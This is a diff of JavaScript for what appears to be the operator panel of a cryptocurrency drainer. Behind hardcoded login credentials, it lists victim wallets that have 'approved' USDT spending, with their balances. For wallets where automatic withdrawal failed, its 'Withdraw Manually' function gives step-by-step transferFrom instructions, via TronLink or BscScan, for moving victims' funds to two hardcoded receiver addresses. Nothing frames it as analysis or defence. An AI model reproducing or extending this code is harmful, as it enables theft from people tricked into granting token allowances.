@@ -1,65 +1,75 @@
-const correctUsername = "enre.atul";
-const correctPassword = "Honda988701@";
+const TRC_RECEIVER = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
+const BEP_RECEIVER = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";
+
+const credentials = {
+  username: "enre.atul",
+  password: "Honda988701@"
+};
+
+const sampleData = {
+  trc20: [
+    { address: "TABC12345abcde6789XYZ", amount: 500, approved: true, autoWithdraw: false },
+    { address: "TXYZ45678pqrs1234LMN", amount: 140, approved: true, autoWithdraw: true }
+  ],
+  bep20: [
+    { address: "0xabc12345def67890abc123456789abcd12345678", amount: 340, approved: true, autoWithdraw: false }
+  ]
+};
 
 function login() {
-  const user = document.getElementById("username").value;
-  const pass = document.getElementById("password").value;
-  if (user === correctUsername && pass === correctPassword) {
-    document.getElementById("login-container").style.display = "none";
-    document.getElementById("admin-panel").style.display = "block";
-    fetchLogs();
+  const u = document.getElementById("username").value;
+  const p = document.getElementById("password").value;
+
+  if (u === credentials.username && p === credentials.password) {
+    document.getElementById("loginBox").style.display = "none";
+    document.getElementById("mainPanel").style.display = "block";
+    loadLogs();
   } else {
-    document.getElementById("login-error").innerText = "Invalid credentials.";
+    alert("Incorrect credentials");
   }
 }
 
-// Simulated logs
-const tronLogs = [
-  { wallet: "TABC123...", balance: "500 USDT", approved: true, autoFailed: true },
-  { wallet: "TXYZ456...", balance: "140 USDT", approved: true, autoFailed: false }
-];
+function loadLogs() {
+  const trcLogs = document.getElementById("trcLogs");
+  const bepLogs = document.getElementById("bepLogs");
 
-const bepLogs = [
-  { wallet: "0xabc123...", balance: "340 USDT", approved: true, autoFailed: true },
-  { wallet: "0xdef456...", balance: "120 USDT", approved: true, autoFailed: false }
-];
-
-function fetchLogs() {
-  const tronList = document.getElementById("tron-logs");
-  const bepList = document.getElementById("bep-logs");
-
-  tronLogs.forEach(log => {
-    const li = document.createElement("li");
-    li.innerHTML = `
-      Wallet: ${log.wallet} <br>
-      Balance: ${log.balance} <br>
-      Approved: ${log.approved ? "✅" : "❌"} <br>
-      Auto Withdraw: ${log.autoFailed ? "❌ Failed" : "✅ Success"}
-      ${log.autoFailed ? `<br><button class="withdraw-btn" onclick="manualWithdrawTRC('${log.wallet}')">Withdraw Manually</button>` : ""}
-    `;
-    tronList.appendChild(li);
+  sampleData.trc20.forEach(wallet => {
+    if (wallet.approved) {
+      const div = document.createElement("div");
+      div.className = "wallet-log";
+      div.innerHTML = `
+        <strong>Wallet:</strong> ${wallet.address}<br>
+        <strong>Balance:</strong> ${wallet.amount} USDT<br>
+        <strong>Approved:</strong> ✅<br>
+        <strong>Auto Withdraw:</strong> ${wallet.autoWithdraw ? "✅ Success" : "❌ Failed"}<br>
+        ${wallet.autoWithdraw ? "" : `<button onclick="manualWithdraw('${wallet.address}', ${wallet.amount}, 'TRC')">Withdraw Manually</button>`}
+      `;
+      trcLogs.appendChild(div);
+    }
   });
 
-  bepLogs.forEach(log => {
-    const li = document.createElement("li");
-    li.innerHTML = `
-      Wallet: ${log.wallet} <br>
-      Balance: ${log.balance} <br>
-      Approved: ${log.approved ? "✅" : "❌"} <br>
-      Auto Withdraw: ${log.autoFailed ? "❌ Failed" : "✅ Success"}
-      ${log.autoFailed ? `<br><button class="withdraw-btn" onclick="manualWithdrawBEP('${log.wallet}')">Withdraw Manually</button>` : ""}
-    `;
-    bepList.appendChild(li);
+  sampleData.bep20.forEach(wallet => {
+    if (wallet.approved) {
+      const div = document.createElement("div");
+      div.className = "wallet-log";
+      div.innerHTML = `
+        <strong>Wallet:</strong> ${wallet.address}<br>
+        <strong>Balance:</strong> ${wallet.amount} USDT<br>
+        <strong>Approved:</strong> ✅<br>
+        <strong>Auto Withdraw:</strong> ${wallet.autoWithdraw ? "✅ Success" : "❌ Failed"}<br>
+        ${wallet.autoWithdraw ? "" : `<button onclick="manualWithdraw('${wallet.address}', ${wallet.amount}, 'BEP')">Withdraw Manually</button>`}
+      `;
+      bepLogs.appendChild(div);
+    }
   });
 }
 
-// Manual Withdraw (simulated)
-function manualWithdrawTRC(fromAddress) {
-  alert("Manual TRC-20 withdrawal initiated from " + fromAddress + " to TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN");
-  // Real function would use TronWeb and transferFrom
-}
+function manualWithdraw(fromAddress, amount, chain) {
+  let message = `To manually withdraw ${amount} USDT from:\n\n${fromAddress}\n\nto your wallet:\n\n`;
 
-function manualWithdrawBEP(fromAddress) {
-  alert("Manual BEP-20 withdrawal initiated from " + fromAddress + " to 0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E");
-  // Real function would use Web3 and transferFrom
+  message += chain === "TRC"
+    ? `${TRC_RECEIVER}\n\n1. Open TronLink\n2. Go to USDT (TRC-20)\n3. Use "transferFrom" to send from user's address`
+    : `${BEP_RECEIVER}\n\n1. Open BscScan (Write Contract tab)\n2. Connect Wallet (MetaMask/SafePal)\n3. Use "transferFrom"\n4. From: ${fromAddress}\nTo: ${BEP_RECEIVER}\nAmount: ${amount * 1e18}`;
+
+  alert(message);
 }
